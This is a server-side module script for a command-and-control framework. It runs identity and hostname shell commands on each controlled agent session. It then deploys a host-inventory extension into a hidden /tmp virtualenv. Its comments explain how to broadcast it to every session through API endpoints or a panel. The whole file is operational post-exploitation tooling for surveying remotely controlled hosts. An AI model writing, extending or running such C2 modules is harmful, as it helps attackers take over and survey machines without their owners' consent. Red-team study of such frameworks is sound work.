// survey_orchestrator.rhai — server-side module (runs on the C2 server)
//
// Deploys and orchestrates the agent-side extension "py_host_inventory"
// across sessions. Module source never leaves the server: it is executed
// once per session by the module runner (src/api/routes/modules.rs) with
// three native bindings available:
//
//   send_c2_command(session_id, "shell ...")  -> queue a raw agent command
//   send_c2_extension(session_id, name, args) -> queue ext:load of a named
//                                                extension from extensions/
//   random_hex_key()                          -> 64-char random hex string
//   print(...)                                -> captured into the API response
//
// Usage (module args):
//   args[0] = venv path for the Python bridge (optional,
//             default "/tmp/.rcm_inv_venv")
//
// Run it:
//   • per session:  POST /api/hosts/:id/modules/survey_orchestrator
//                   body: {"args": ["/var/tmp/inv"]}   (args optional)
//   • all sessions: POST /api/broadcast/module
//                   body: {"module_name": "survey_orchestrator",
//                          "args": ["/var/tmp/inv"]}
//   • panel:        Scripts page -> Modules tab -> Run / Broadcast
//
// The module declares run(session_id, args); the runner automatically falls
// back to calling it with an empty args array when none are supplied.

fn run(session_id, args) {
    // A fresh random ID per run — use it to correlate server-side audit
    // entries with the agent-side job output. Never hardcode identifiers
    // or (crypto) keys into a module; random_hex_key exists so you don't.
    let run_id  = random_hex_key();
    let run_tag = run_id.sub_string(0, 12);

    let venv = "/tmp/.rcm_inv_venv";
    if args.len() > 0 {
        venv = args[0];
    }

    print("survey_orchestrator[" + run_tag + "]: session " + session_id.to_string());

    // 1. Quick context commands so the session history shows who/where even
    //    if the extension step fails. All OS commands need the "shell "
    //    prefix so the agent's dispatcher passes them to the OS shell.
    let r_user = send_c2_command(session_id, "shell whoami");
    let r_host = send_c2_command(session_id, "shell hostname");
    print("whoami   -> " + r_user);
    print("hostname -> " + r_host);

    // 2. Deploy the inventory extension on the agent, passing the venv path
    //    as its args[0] and the run tag as its args[1] (report label).
    //    Returns a queue-status string such as "Queued extension ...",
    //    "Session Not Found", or an error if the extension file is missing.
    let res = send_c2_extension(session_id, "py_host_inventory", [venv, run_tag]);

    if res.contains("Error") || res.contains("Not Found") {
        return "survey " + run_tag + " FAILED: " + res
             + " (context commands were still queued: "
             + r_user + ", " + r_host + ")";
    }

    // 3. Summary returned to the API caller alongside all print() output.
    return "survey " + run_tag + ": context queued ("
         + r_user + ", " + r_host + "); " + res
         + "; output streams back as a job on the agent";
}
